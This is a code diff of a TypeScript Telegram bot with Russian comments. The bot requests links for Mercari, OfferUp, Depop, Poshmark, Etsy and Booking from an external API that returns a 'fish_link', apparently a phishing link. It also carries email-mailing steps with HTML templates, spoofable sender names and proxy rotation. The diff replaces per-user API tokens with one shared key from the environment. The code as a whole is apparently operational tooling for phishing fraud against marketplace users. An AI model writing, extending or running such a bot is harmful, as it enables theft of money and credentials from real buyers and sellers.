@@ -10,7 +10,7 @@ dotenv.config();
 type Platform = 'MERCARI_USA' | 'OFFERUP_USA' | 'DEPOP_USA' | 'DEPOP_UK' | 'POSHMARK_USA' | 'BOOKING' | 'ETSY';
 
 interface SessionData {
-    step: 'IDLE' | 'WAITING_TOKEN' | 'WAITING_PROXY_ADD' | 'WAITING_EMAIL_ADD' | 'WAITING_JSON_UPLOAD' | 'WAITING_SINGLE_EMAIL' |
+    step: 'IDLE' | 'WAITING_PROXY_ADD' | 'WAITING_EMAIL_ADD' | 'WAITING_JSON_UPLOAD' | 'WAITING_SINGLE_EMAIL' |
         'WAITING_TEXT_NAME' | 'WAITING_TEXT_SUBJECT' | 'WAITING_TEXT_BODY' | 'WAITING_TEXT_SENDER' |
         'WAITING_HTML_NAME' | 'WAITING_HTML_SUBJECT' | 'WAITING_HTML_LINK' | 'WAITING_HTML_FILE' | 'WAITING_HTML_SENDER' | 'WAITING_MANUAL_NAME';
     selectedDelay: { min: number; max: number };
@@ -27,6 +27,7 @@ interface SessionData {
 type MyContext = Context & SessionFlavor<SessionData>;
 
 const proxyUrl = process.env.PROXY_URL;
+const token = process.env.SHARED_API_KEY;
 // Создаем агент только если строка не пустая, иначе ставим undefined
 const proxyAgent = proxyUrl ? new SocksProxyAgent(proxyUrl) : undefined;
 
@@ -588,20 +589,6 @@ mainMenu = new Menu<MyContext>('main-menu')
         await ctx.editMessageText("🌍 Выберите регион:", { reply_markup: genPlatformsMenu });
     })
     .row()
-    .text("🔑  Управление токеном", async (ctx) => {
-        const userId = String(ctx.from?.id);
-        const user = await prisma.user.findUnique({ where: { telegramId: userId } });
-        await ctx.reply(
-            user?.token
-                ? `🔑 *Токен установлен*\n\n✅ Ваш токен активен\n\nХотите обновить?`
-                : `🔑 *Токен не установлен*\n\n❌ Введите ваш токен API`,
-            { parse_mode: 'Markdown' }
-        );
-        ctx.session.step = 'WAITING_TOKEN';
-        const msg = await ctx.reply("📝 Введите ваш личный токен API:");
-        ctx.session.lastBotMessageId = msg.message_id;
-    })
-    .row()
     .dynamic(async (ctx, range) => {
         const userId = String(ctx.from?.id);
         const isActive = mailingState[userId] === 'RUNNING' || mailingState[userId] === 'PAUSED';
@@ -672,15 +659,6 @@ bot.command('start', async (ctx) => {
     const userId = String(ctx.from?.id);
     const user = await prisma.user.findUnique({ where: { telegramId: userId } });
 
-    if (!user?.token) {
-        ctx.session.step = 'WAITING_TOKEN';
-        try { await ctx.deleteMessage(); } catch(e){}
-        await clearLastBotMessage(ctx);
-        const msg = await ctx.reply("🔑 *Для начала работы введите ваш личный токен API:*\n\nТокен выдается один раз при регистрации аккаунта на сервисе.", { parse_mode: 'Markdown' });
-        ctx.session.lastBotMessageId = msg.message_id;
-        return;
-    }
-
     ctx.session.step = 'IDLE';
     try { await ctx.deleteMessage(); } catch(e){}
     await clearLastBotMessage(ctx);
@@ -697,31 +675,8 @@ bot.on('message', async (ctx) => {
     const step = ctx.session.step;
     const userId = String(ctx.from.id);
 
-    // ── ВВОД ТОКЕНА ────────────────────────────
-    if (step === 'WAITING_TOKEN' && ctx.message.text) {
-        try { await ctx.deleteMessage(); } catch(e){}
-        await clearLastBotMessage(ctx);
-        const token = ctx.message.text.trim();
-
-        if (token.length < 10) {
-            const msg = await ctx.reply("❌ Токен слишком короткий. Проверьте и попробуйте снова.");
-            ctx.session.lastBotMessageId = msg.message_id;
-            return;
-        }
-
-        await prisma.user.upsert({
-            where: { telegramId: userId },
-            update: { token },
-            create: { telegramId: userId, token }
-        });
-
-        ctx.session.step = 'IDLE';
-        await ctx.reply("✅ Токен сохранён! Теперь вы готовы к работе.", { reply_markup: mainMenu });
-    }
-
     // ДОБАВЛЕНИЕ ПРОКСИ
-
-    else if (step === 'WAITING_PROXY_ADD' && ctx.message.text) {
+    if (step === 'WAITING_PROXY_ADD' && ctx.message.text) {
         try { await ctx.deleteMessage(); } catch(e){}
         await clearLastBotMessage(ctx);
 
@@ -976,24 +931,29 @@ bot.on('message', async (ctx) => {
 
     // ── РУЧНАЯ ГЕНЕРАЦИЯ ССЫЛКИ ───────────────
     else if (step === 'WAITING_MANUAL_NAME' && ctx.message.text) {
-        try { await ctx.deleteMessage(); } catch(e){}
+        try {
+            await ctx.deleteMessage();
+        } catch (e) {
+        }
         const name = ctx.message.text.trim();
         const platform = ctx.session.manualPlatform || 'DEPOP_USA';
         const label = platformLabels[platform] || platform;
+        const userId = String(ctx.from.id);  // ← Телеграм ID юзера
 
         const waitMsg = await ctx.reply("⏳ Генерирую ссылку...");
 
         try {
-            const user = await prisma.user.findUnique({ where: { telegramId: userId } });
-            if (!user?.token) {
-                throw new Error('Токен не установлен');
+            // ✅ ИСПОЛЬЗУЙ токен из ENV!
+            const apiToken = process.env.SHARED_API_KEY;
+            if (!apiToken) {
+                throw new Error('API токен не установлен в .env');
             }
 
             const platformToService: Record<string, string> = {
-                MERCARI_USA:  'mercari3_usa',
-                OFFERUP_USA:  'offerup3_usa',
-                DEPOP_USA:    'depop3_usa',
-                DEPOP_UK:     'depop3_uk',
+                MERCARI_USA: 'mercari3_usa',
+                OFFERUP_USA: 'offerup3_usa',
+                DEPOP_USA: 'depop3_usa',
+                DEPOP_UK: 'depop3_uk',
                 POSHMARK_USA: 'poshmark3_eu',
                 ETSY: 'etsy_eu',
                 BOOKING: 'booking_eu_parse'
@@ -1001,12 +961,12 @@ bot.on('message', async (ctx) => {
 
             const response = await fetch('https://api.k7r4q9p2z1x1.cfd/api/protected', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    api_key: user.token,
+                    api_key: apiToken,  // ← Общий токен из ENV
                     title: name,
                     service: platformToService[platform],
-                    userId: userId
+                    userId: userId  // ← РАЗНЫЙ userId для каждого юзера! ✅
                 })
             });
 
@@ -1020,26 +980,38 @@ bot.on('message', async (ctx) => {
             const shortLink = data.fish_link || fullLink;
             const searchLink = data.search_link || '—';
 
-            try { await ctx.api.deleteMessage(ctx.chat!.id, waitMsg.message_id); } catch {}
+            try {
+                await ctx.api.deleteMessage(ctx.chat!.id, waitMsg.message_id);
+            } catch {
+            }
 
             await ctx.reply(
                 `🔗 *Ссылка сгенерирована*\n\n` +
                 `🏪 Площадка: *${label}*\n` +
-                `👤 Имя: *${name}*\n\n` +
+                `👤 Имя: *${name}*\n` +
+                `👥 UserID: *${userId}*\n\n` +  // ← Показываем какой userId использовался
                 `📎 Основная:\n\`${shortLink}\`\n\n` +
                 `✂️ Короткая:\n\`${fullLink}\`\n\n` +
                 `🔍 Поиск:\n\`${searchLink}\``,
-                { parse_mode: 'Markdown', reply_markup: mainMenu }
+                {parse_mode: 'Markdown', reply_markup: mainMenu}
             );
         } catch (err: any) {
-            try { await ctx.api.deleteMessage(ctx.chat!.id, waitMsg.message_id); } catch {}
-            await ctx.reply(`❌ Ошибка: ${err.message}. Проверьте токен в управлении токеном.`, { parse_mode: 'Markdown', reply_markup: mainMenu });
+            try {
+                await ctx.api.deleteMessage(ctx.chat!.id, waitMsg.message_id);
+            } catch {
+            }
+            await ctx.reply(`❌ Ошибка: ${err.message}. Проверьте токен в .env.`, {
+                parse_mode: 'Markdown',
+                reply_markup: mainMenu
+            });
         }
 
         ctx.session.step = 'IDLE';
         ctx.session.manualPlatform = undefined;
-    }
-});
+
+    }});
+
+
 
 // ─────────────────────────────────────────────
 // ОБРАБОТЧИК ОШИБОК
